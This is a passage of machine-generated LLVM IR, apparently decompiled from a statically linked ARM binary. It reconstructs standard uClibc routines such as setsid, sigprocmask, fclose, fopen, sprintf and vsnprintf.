  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f9a4, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f9ac = load i32, i32* @r4, align 4
  store i32 %v3_f9ac, i32* %stack_var_-8, align 4
  %v0_f9b0 = call i32 @setsid()
  store i32 %v0_f9b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f9b0, -4095
  br i1 %tmp, label %dec_label_pc_f9d0, label %dec_label_pc_f9c0

dec_label_pc_f9c0:                                ; preds = %entry
  %v0_f9c0 = call i32 @__errno_location()
  %v0_f9c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f9c4 = sub i32 0, %v0_f9c4
  %v2_f9c8 = inttoptr i32 %v0_f9c0 to i32*
  store i32 %v1_f9c4, i32* %v2_f9c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f9d0

dec_label_pc_f9d0:                                ; preds = %entry, %dec_label_pc_f9c0
  %v0_f9d0 = phi i32 [ %v0_f9b0, %entry ], [ -1, %dec_label_pc_f9c0 ]
  %v2_f9d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f9d4, i32* @r4, align 4
  ret i32 %v0_f9d0

; uselistorder directives
  uselistorder i32 %v0_f9b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f9d0, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f9d8 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_f9d8, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_f9e05 = load i32, i32* @r4, align 4
  store i32 %v3_f9e05, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fa00

bb:                                               ; preds = %entry
  %v3_f9e0 = load i32, i32* @r4, align 4
  store i32 %v3_f9e0, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_fa00, label %dec_label_pc_f9ec

dec_label_pc_f9ec:                                ; preds = %bb
  %v0_f9ec = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f9f8 = inttoptr i32 %v0_f9ec to i32*
  store i32 22, i32* %v2_f9f8, align 4
  %v0_fa24.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fa24

dec_label_pc_fa00:                                ; preds = %.thread, %bb
  %v7_fa00 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_fa00, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_fa00, -4095
  br i1 %tmp13, label %dec_label_pc_fa20, label %dec_label_pc_fa10

dec_label_pc_fa10:                                ; preds = %dec_label_pc_fa00
  %v0_fa10 = call i32 @__errno_location()
  %v0_fa14 = load i32, i32* %r4.global-to-local, align 4
  %v1_fa14 = sub i32 0, %v0_fa14
  %v2_fa18 = inttoptr i32 %v0_fa10 to i32*
  store i32 %v1_fa14, i32* %v2_fa18, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa20

dec_label_pc_fa20:                                ; preds = %dec_label_pc_fa00, %dec_label_pc_fa10
  %v0_fa20 = phi i32 [ %v7_fa00, %dec_label_pc_fa00 ], [ -1, %dec_label_pc_fa10 ]
  store i32 %v0_fa20, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fa24

dec_label_pc_fa24:                                ; preds = %dec_label_pc_f9ec, %dec_label_pc_fa20
  %v0_fa24 = phi i32 [ %v0_fa24.pre, %dec_label_pc_f9ec ], [ %v0_fa20, %dec_label_pc_fa20 ]
  %v2_fa28 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa28, i32* @r4, align 4
  ret i32 %v0_fa24

; uselistorder directives
  uselistorder i32 %v7_fa00, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_fa24, { 1, 0 }
  uselistorder label %dec_label_pc_fa20, { 1, 0 }
  uselistorder label %dec_label_pc_fa00, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa2c = load i32, i32* @r4, align 4
  store i32 %v3_fa2c, i32* %stack_var_-8, align 4
  %v2_fa30 = call i32 @time(i32* %arg1)
  store i32 %v2_fa30, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_fa30, -4095
  br i1 %tmp, label %dec_label_pc_fa50, label %dec_label_pc_fa40

dec_label_pc_fa40:                                ; preds = %entry
  %v0_fa40 = call i32 @__errno_location()
  %v0_fa44 = load i32, i32* %r4.global-to-local, align 4
  %v1_fa44 = sub i32 0, %v0_fa44
  %v2_fa48 = inttoptr i32 %v0_fa40 to i32*
  store i32 %v1_fa44, i32* %v2_fa48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa50

dec_label_pc_fa50:                                ; preds = %entry, %dec_label_pc_fa40
  %v0_fa50 = phi i32 [ %v2_fa30, %entry ], [ -1, %dec_label_pc_fa40 ]
  %v2_fa54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa54, i32* @r4, align 4
  ret i32 %v0_fa50

; uselistorder directives
  uselistorder i32 %v2_fa30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa50, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_fa5c = call i32 @wait4()
  ret i32 %v0_fa5c
}

define i32 @__libc_write(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa60 = load i32, i32* @r4, align 4
  store i32 %v3_fa60, i32* %stack_var_-8, align 4
  %v3_fa64 = load i32, i32* @r2, align 4
  %v4_fa64 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_fa64)
  store i32 %v4_fa64, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_fa64, -4095
  br i1 %tmp, label %dec_label_pc_fa84, label %dec_label_pc_fa74

dec_label_pc_fa74:                                ; preds = %entry
  %v0_fa74 = call i32 @__errno_location()
  %v0_fa78 = load i32, i32* %r4.global-to-local, align 4
  %v1_fa78 = sub i32 0, %v0_fa78
  %v2_fa7c = inttoptr i32 %v0_fa74 to i32*
  store i32 %v1_fa78, i32* %v2_fa7c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fa84

dec_label_pc_fa84:                                ; preds = %entry, %dec_label_pc_fa74
  %v0_fa84 = phi i32 [ %v4_fa64, %entry ], [ -1, %dec_label_pc_fa74 ]
  %v2_fa88 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fa88, i32* @r4, align 4
  ret i32 %v0_fa84

; uselistorder directives
  uselistorder i32 %v4_fa64, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa84, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v2_fa90 = load i32, i32* @global_var_231b0, align 4
  %v3_fa94 = mul i32 %arg1, 2
  %v4_fa94 = add i32 %v2_fa90, %v3_fa94
  %v5_fa94 = inttoptr i32 %v4_fa94 to i8*
  %v6_fa94 = load i8, i8* %v5_fa94, align 1
  %v8_fa94 = zext i8 %v6_fa94 to i32
  %v1_fa98 = and i32 %v8_fa94, 32
  ret i32 %v1_fa98
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_faac = icmp slt i32 %arg1, 0
  br i1 %v1_faac, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_faac = mul i32 %arg1, 2
  %v2_fab8 = load i32, i32* @global_var_231b8, align 4
  %v2_fabc = add i32 %v2_fab8, %v2_faac
  %v3_fac0 = inttoptr i32 %v2_fabc to i8*
  %v4_fac0 = load i8, i8* %v3_fac0, align 1
  %v6_fac0 = zext i8 %v4_fac0 to i32
  %v1_fac4 = add i32 %v2_fabc, 1
  %v2_fac4 = inttoptr i32 %v1_fac4 to i8*
  %v3_fac4 = load i8, i8* %v2_fac4, align 1
  %v4_fac4 = zext i8 %v3_fac4 to i32
  %v3_fac8 = mul nuw i32 %v4_fac4, 16777216
  %v4_facc = sdiv i32 %v3_fac8, 65536
  %v5_facc = or i32 %v4_facc, %v6_fac0
  ret i32 %v5_facc

; uselistorder directives
  uselistorder i32 %v2_fabc, { 1, 0 }
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_29784.303 to i32)
}

define i32 @__GI_fclose(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_fae4 = load i32, i32* @r4, align 4
  store i32 %v3_fae4, i32* %stack_var_-32, align 4
  %v6_fae4 = load i32, i32* @r5, align 4
  %v9_fae4 = load i32, i32* @r6, align 4
  %v12_fae4 = load i32, i32* @r7, align 4
  %v15_fae4 = load i32, i32* @r8, align 4
  %v2_fae8 = add i32 %tmp, 52
  %v3_fae8 = inttoptr i32 %v2_fae8 to i32*
  %v4_fae8 = load i32, i32* %v3_fae8, align 4
  store i32 %v4_fae8, i32* @r8, align 4
  %v2_faec = add i32 %tmp, 56
  store i32 %v2_faec, i32* @r5, align 4
  %v2_faf0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_faf4 = icmp eq i32 %v4_fae8, 0
  store i1 %v2_faf4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  %v2_fb04 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_fb04, i32* @r0, align 4
  br i1 %v2_faf4, label %dec_label_pc_fb0c, label %dec_label_pc_fb28

dec_label_pc_fb0c:                                ; preds = %entry
  store i32 79548, i32* %r3.global-to-local, align 4
  %v1_fb14 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_136b4.305 to i32), i32* %r3.global-to-local, align 4
  %v1_fb24 = call i32 @__pthread_return_0()
  %v0_fb28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fb28

dec_label_pc_fb28:                                ; preds = %entry, %dec_label_pc_fb0c
  %v0_fb30 = phi i32 [ %tmp, %entry ], [ %v0_fb28.pre, %dec_label_pc_fb0c ]
  %v1_fb28 = inttoptr i32 %v0_fb30 to i8*
  %v2_fb28 = load i8, i8* %v1_fb28, align 1
  %v3_fb28 = zext i8 %v2_fb28 to i32
  %v1_fb2c = and i32 %v3_fb28, 64
  store i32 %v1_fb2c, i32* %r3.global-to-local, align 4
  %v2_fb2c = icmp eq i32 %v1_fb2c, 0
  store i1 %v2_fb2c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_fb2c, i32* @r7, align 4
  br i1 %v2_fb2c, label %dec_label_pc_fb44, label %dec_label_pc_fb3c

dec_label_pc_fb3c:                                ; preds = %dec_label_pc_fb28
  %v3_fb3c = call i32 @fflush_unlocked(i8* %v1_fb28)
  store i32 %v3_fb3c, i32* @r7, align 4
  %v0_fb44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fb44

dec_label_pc_fb44:                                ; preds = %dec_label_pc_fb28, %dec_label_pc_fb3c
  %v0_fb44 = phi i32 [ %v0_fb30, %dec_label_pc_fb28 ], [ %v0_fb44.pre, %dec_label_pc_fb3c ]
  %v1_fb44 = add i32 %v0_fb44, 4
  %v2_fb44 = inttoptr i32 %v1_fb44 to i32*
  %v3_fb44 = load i32, i32* %v2_fb44, align 4
  %v1_fb48 = call i32 @__libc_close(i32 %v3_fb44)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_fb50 = icmp slt i32 %v1_fb48, 0
  %v2_fb50 = icmp eq i32 %v1_fb48, 0
  store i1 %v2_fb50, i1* %cpsr_z.global-to-local, align 1
  %v1_fb54 = load i32, i32* @r4, align 4
  %v2_fb54 = add i32 %v1_fb54, 4
  %v3_fb54 = inttoptr i32 %v2_fb54 to i32*
  store i32 -1, i32* %v3_fb54, align 4
  store i32 %v2_faf0, i32* @r0, align 4
  br i1 %v1_fb50, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_fb44
  %v3_fb68 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v3_fb68, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_fb44, %bb
  %v1_fb74 = call i32 @__pthread_return_void()
  %v1_fb80 = call i32 @__pthread_return_0()
  %v2_fb88 = load i32, i32* @global_var_27550.311, align 4
  %v1_fb8c = add i32 %v2_fb88, 1
  store i32 %v1_fb8c, i32* %r3.global-to-local, align 4
  store i32 %v1_fb8c, i32* @global_var_27550.311, align 4
  store i32 %v2_faf0, i32* @r0, align 4
  %v1_fba4 = call i32 @__pthread_return_void()
  %v0_fba8 = load i32, i32* @r4, align 4
  %v1_fba8 = inttoptr i32 %v0_fba8 to i32*
  %v2_fba8 = load i32, i32* %v1_fba8, align 4
  %v1_fbac = and i32 %v2_fba8, 24576
  store i32 %v1_fbac, i32* %r3.global-to-local, align 4
  %v3_fbb01 = udiv i32 %v1_fbac, 256
  %v1_fbb4 = trunc i32 %v3_fbb01 to i8
  %v3_fbb4 = add i32 %v0_fba8, 1
  %v4_fbb4 = inttoptr i32 %v3_fbb4 to i8*
  store i8 %v1_fbb4, i8* %v4_fbb4, align 1
  %v0_fbb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_fbb8 = trunc i32 %v0_fbb8 to i8
  %v2_fbb8 = load i32, i32* @r4, align 4
  %v3_fbb8 = inttoptr i32 %v2_fbb8 to i8*
  store i8 %v1_fbb8, i8* %v3_fbb8, align 1
  %v0_fbbc = load i32, i32* @r4, align 4
  %v1_fbbc = inttoptr i32 %v0_fbbc to i32*
  %v2_fbbc = load i32, i32* %v1_fbbc, align 4
  %v1_fbc0 = or i32 %v2_fbbc, 48
  store i32 %v1_fbc0, i32* %r3.global-to-local, align 4
  %v3_fbc4 = sdiv i32 %v2_fbbc, 256
  %v0_fbc8 = load i32, i32* @r8, align 4
  %v2_fbc8 = icmp eq i32 %v0_fbc8, 0
  store i1 %v2_fbc8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_fb04, i32* @r0, align 4
  %v1_fbd8 = trunc i32 %v3_fbc4 to i8
  %v3_fbd8 = add i32 %v0_fbbc, 1
  %v4_fbd8 = inttoptr i32 %v3_fbd8 to i8*
  store i8 %v1_fbd8, i8* %v4_fbd8, align 1
  %v0_fbdc = load i32, i32* %r3.global-to-local, align 4
  %v1_fbdc = trunc i32 %v0_fbdc to i8
  %v2_fbdc = load i32, i32* @r4, align 4
  %v3_fbdc = inttoptr i32 %v2_fbdc to i8*
  store i8 %v1_fbdc, i8* %v3_fbdc, align 1
  %v0_fbe0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fbe0, label %bb16, label %.thread

bb16:                                             ; preds = %bb15
  %v2_fbe4 = call i32 @__pthread_return_void()
  br label %.thread

.thread:                                          ; preds = %bb15, %bb16
  %v0_fbe8 = load i32, i32* @r4, align 4
  %v1_fbe8 = add i32 %v0_fbe8, 1
  %v2_fbe8 = inttoptr i32 %v1_fbe8 to i8*
  %v3_fbe8 = load i8, i8* %v2_fbe8, align 1
  %v4_fbe8 = zext i8 %v3_fbe8 to i32
  store i32 %v4_fbe8, i32* %r3.global-to-local, align 4
  %v1_fbec = and i32 %v4_fbe8, 64
  %v2_fbec = icmp eq i32 %v1_fbec, 0
  store i1 %v2_fbec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fbec, label %bb18, label %bb17

bb17:                                             ; preds = %.thread
  br label %bb18

bb18:                                             ; preds = %.thread, %bb17
  %v1_fbf4 = xor i1 %v2_fbec, true
  call void @__pseudo_cond_branch(i1 %v1_fbf4, i32 ptrtoint (i32* @global_var_126e8.313 to i32))
  store i32 %v2_faf0, i32* @r0, align 4
  %v1_fc08 = call i32 @__pthread_return_void()
  %v1_fc14 = call i32 @__pthread_return_0()
  %v2_fc1c = load i32, i32* @global_var_27554.316, align 4
  %v1_fc20 = add i32 %v2_fc1c, 1
  store i32 %v1_fc20, i32* %r3.global-to-local, align 4
  store i32 %v2_faf0, i32* @r0, align 4
  store i32 %v1_fc20, i32* @global_var_27554.316, align 4
  %v1_fc34 = call i32 @__pthread_return_void()
  %v1_fc38 = call i32 @_stdio_openlist_dec_use(i32 %v1_fc34)
  %v0_fc3c = load i32, i32* @r7, align 4
  %v2_fc44 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_fc44, i32* @r4, align 4
  store i32 %v6_fae4, i32* @r5, align 4
  store i32 %v9_fae4, i32* @r6, align 4
  store i32 %v12_fae4, i32* @r7, align 4
  store i32 %v15_fae4, i32* @r8, align 4
  ret i32 %v0_fc3c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_fb44, { 1, 0 }
  uselistorder label %dec_label_pc_fb28, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_fc6c = call i32 @_stdio_fopen()
  ret i32 %v0_fc6c
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_fc7c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_fc7c, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_fc90 = call i32 @__GI_vsnprintf()
  ret i32 %v0_fc90

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_fca4 = load i32, i32* @r4, align 4
  %v6_fca4 = load i32, i32* @r5, align 4
  %v12_fca4 = load i32, i32* @r7, align 4
  %v15_fca4 = load i32, i32* @r8, align 4
  %v18_fca4 = load i32, i32* @sl, align 4
  %v0_fca8 = load i32, i32* @r3, align 4
  store i32 %v0_fca8, i32* @r8, align 4
  %v2_fcac = ptrtoint i32* %stack_var_-108 to i32
  %v0_fcb4 = load i32, i32* @r0, align 4
  %v1_fcb4 = sub i32 -1, %v0_fcb4
  store i32 %v1_fcb4, i32* @r5, align 4
  store i32 %v0_fcb4, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_fcc8 = load i32, i32* @r1, align 4
  %v3_fcc8 = icmp ult i32 %v1_fcb4, %v1_fcc8
  br i1 %v3_fcc8, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_fcc8, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_fcd0 = load i32, i32* @r2, align 4
  store i32 %v0_fcd0, i32* @r7, align 4
  %v2_fcd4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_fcd4, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_fcf0 = call i32 @__stdio_init_mutex()
  %v0_fcf4 = load i32, i32* @r4, align 4
  %v1_fcf4 = load i32, i32* @r5, align 4
  %v2_fcf4 = add i32 %v1_fcf4, %v0_fcf4
  %v0_fcfc = load i32, i32* @r7, align 4
  %v0_fd00 = load i32, i32* @r8, align 4
  %v0_fd0c = load i32, i32* @sl, align 4
  %v12_fd20 = inttoptr i32 %v0_fcfc to i8*
  %v13_fd20 = call i32 @_vfprintf_internal(i32 %v2_fcac, i8* %v12_fd20, i32 %v0_fd00, i32 %v2_fcf4, i32 %v0_fcf4, i32 %v2_fcf4, i32 %v0_fcf4, i32 %v0_fcf4, i32 %v0_fcf4, i32 %v2_fcf4, i32 %v0_fd0c)
  %v0_fd24 = load i32, i32* @r5, align 4
  %v1_fd24 = load i32, i32* @sl, align 4
  %v9_fd24 = icmp eq i32 %v0_fd24, %v1_fd24
  br i1 %v9_fd24, label %dec_label_pc_fd4c, label %dec_label_pc_fd30

dec_label_pc_fd30:                                ; preds = %bb23
  %v9_fd38 = icmp eq i32 %v1_fcf4, 0
  %v1_fd3c = sext i1 %v9_fd38 to i32
  %v1_fd3c.v0_fd04 = add i32 %v0_fcf4, %v1_fd3c
  %stack_var_-92.0 = inttoptr i32 %v1_fd3c.v0_fd04 to i8*
  %v1_fd48 = trunc i32 %v1_fd24 to i8
  store i8 %v1_fd48, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_fd4c

dec_label_pc_fd4c:                                ; preds = %bb23, %dec_label_pc_fd30
  store i32 %v3_fca4, i32* @r4, align 4
  store i32 %v6_fca4, i32* @r5, align 4
  store i32 %v12_fca4, i32* @r7, align 4
  store i32 %v15_fca4, i32* @r8, align 4
  store i32 %v18_fca4, i32* @sl, align 4
  ret i32 %v13_fd20

; uselistorder directives
  uselistorder i32 %v1_fcf4, { 1, 0 }
  uselistorder i32 %v0_fcf4, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %v1_fcc8, { 1, 0 }
  uselistorder i32 %v0_fcb4, { 1, 0 }
  uselistorder label %dec_label_pc_fd4c, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_fd54 = load i32, i32* @r4, align 4
  store i32 %v3_fd54, i32* %stack_var_-24, align 4
  %v6_fd54 = load i32, i32* @r5, align 4
  %v9_fd54 = load i32, i32* @r6, align 4
  %v15_fd54 = load i32, i32* @r8, align 4
  %v0_fd58 = load i32, i32* @r1, align 4
  %v1_fd58 = inttoptr i32 %v0_fd58 to i8*
  %v2_fd58 = load i8, i8* %v1_fd58, align 1
  %v7_fd5c = icmp eq i8 %v2_fd58, 114
  store i1 %v7_fd5c, i1* %cpsr_z.global-to-local, align 1
  %v2_fd60 = ptrtoint i32* %stack_var_-56 to i32
  %v0_fd64 = load i32, i32* @r0, align 4
  store i32 %v0_fd64, i32* @r6, align 4
  %v0_fd68 = load i32, i32* @r2, align 4
  store i32 %v0_fd68, i32* @r8, align 4
  %v0_fd6c = load i32, i32* @r3, align 4
  store i32 %v0_fd6c, i32* @r5, align 4
  br i1 %v7_fd5c, label %dec_label_pc_fdb8, label %dec_label_pc_fd74

dec_label_pc_fd74:                                ; preds = %entry
  %v7_fd74 = icmp eq i8 %v2_fd58, 119
  store i1 %v7_fd74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd74, label %bb, label %dec_label_pc_fd80

bb:                                               ; preds = %dec_label_pc_fd74
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_fdbc

dec_label_pc_fd80:                                ; preds = %dec_label_pc_fd74
  %v7_fd80 = icmp eq i8 %v2_fd58, 97
  store i1 %v7_fd80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fd80, label %bb30, label %dec_label_pc_fd8c

bb30:                                             ; preds = %dec_label_pc_fd80
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_fdbc

dec_label_pc_fd8c:                                ; preds = %dec_label_pc_fd80, %dec_label_pc_fe44, %dec_label_pc_fe18
  %v0_fd8c = call i32 @__errno_location()
  store i32 %v0_fd8c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_fd94 = load i32, i32* @r8, align 4
  %v2_fd94 = icmp eq i32 %v0_fd94, 0
  store i1 %v2_fd94, i1* %cpsr_z.global-to-local, align 1
  %v2_fd98 = inttoptr i32 %v0_fd8c to i32*
  store i32 22, i32* %v2_fd98, align 4
  br i1 %v2_fd94, label %dec_label_pc_1000c, label %dec_label_pc_fda0

dec_label_pc_fda0:                                ; preds = %dec_label_pc_fe68._crit_edge, %dec_label_pc_fd8c
  %v0_fda0 = load i32, i32* @r8, align 4
  %v1_fda0 = add i32 %v0_fda0, 1
  %v2_fda0 = inttoptr i32 %v1_fda0 to i8*
  %v3_fda0 = load i8, i8* %v2_fda0, align 1
  %v4_fda0 = zext i8 %v3_fda0 to i32
  store i32 %v4_fda0, i32* %r3.global-to-local, align 4
  %v1_fda4 = and i32 %v4_fda0, 32
  %v2_fda4 = icmp eq i32 %v1_fda4, 0
  store i1 %v2_fda4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fda4, label %dec_label_pc_1000c, label %dec_label_pc_fdac

dec_label_pc_fdac:                                ; preds = %dec_label_pc_fda0
  store i32 %v0_fda0, i32* @r0, align 4
  %v0_fdb0 = call i32 @free()
  store i32 %v0_fdb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000c

dec_label_pc_fdb8:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_fdbc

dec_label_pc_fdbc:                                ; preds = %bb, %bb30, %dec_label_pc_fdb8
  %v1_fdd4 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_fdb8 ]
  %v1_fdbc = add i32 %v0_fd58, 1
  %v2_fdbc = inttoptr i32 %v1_fdbc to i8*
  %v3_fdbc = load i8, i8* %v2_fdbc, align 1
  %v7_fdc0 = icmp eq i8 %v3_fdbc, 98
  store i1 %v7_fdc0, i1* %cpsr_z.global-to-local, align 1
  %v1_fdbc.v0_fd58 = select i1 %v7_fdc0, i32 %v1_fdbc, i32 %v0_fd58
  store i32 %v1_fdbc.v0_fd58, i32* %r3.global-to-local, align 4
  %v1_fdcc = add i32 %v1_fdbc.v0_fd58, 1
  %v2_fdcc = inttoptr i32 %v1_fdcc to i8*
  %v3_fdcc = load i8, i8* %v2_fdcc, align 1
  %v4_fdcc = zext i8 %v3_fdcc to i32
  store i32 %v4_fdcc, i32* %r3.global-to-local, align 4
  %v7_fdd0 = icmp eq i8 %v3_fdcc, 43
  store i1 %v7_fdd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fdd0, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_fdbc
  store i32 %v1_fdd4, i32* %r3.global-to-local, align 4
  %v2_fdd8 = add nuw nsw i32 %v1_fdd4, 1
  store i32 %v2_fdd8, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_fdbc, %bb33
  %v2_fddc = icmp eq i32 %v0_fd68, 0
  store i1 %v2_fddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fddc, label %dec_label_pc_fde4, label %dec_label_pc_fe10

dec_label_pc_fde4:                                ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_fde8 = call i32 @malloc(i32 80)
  store i32 %v1_fde8, i32* %r0.global-to-local, align 4
  store i32 %v1_fde8, i32* @r8, align 4
  %v3_fdec = icmp eq i32 %v1_fde8, 0
  store i1 %v3_fdec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_fdec, label %dec_label_pc_10010, label %dec_label_pc_fdf4

dec_label_pc_fdf4:                                ; preds = %dec_label_pc_fde4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_fdfc = add i32 %v1_fde8, 1
  %v4_fdfc = inttoptr i32 %v3_fdfc to i8*
  store i8 32, i8* %v4_fdfc, align 1
  %v0_fe00 = load i32, i32* %r2.global-to-local, align 4
  %v1_fe00 = load i32, i32* @r8, align 4
  %v2_fe00 = add i32 %v1_fe00, 8
  %v3_fe00 = inttoptr i32 %v2_fe00 to i32*
  store i32 %v0_fe00, i32* %v3_fe00, align 4
  %v0_fe04 = load i32, i32* %r2.global-to-local, align 4
  %v1_fe04 = trunc i32 %v0_fe04 to i8
  %v2_fe04 = load i32, i32* @r8, align 4
  %v3_fe04 = inttoptr i32 %v2_fe04 to i8*
  store i8 %v1_fe04, i8* %v3_fe04, align 1
  %v0_fe08 = load i32, i32* @r8, align 4
  %v1_fe08 = add i32 %v0_fe08, 56
  store i32 %v1_fe08, i32* @r0, align 4
  %v0_fe0c = call i32 @__stdio_init_mutex()
  store i32 %v0_fe0c, i32* %r0.global-to-local, align 4
  %v0_fe10.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fe10

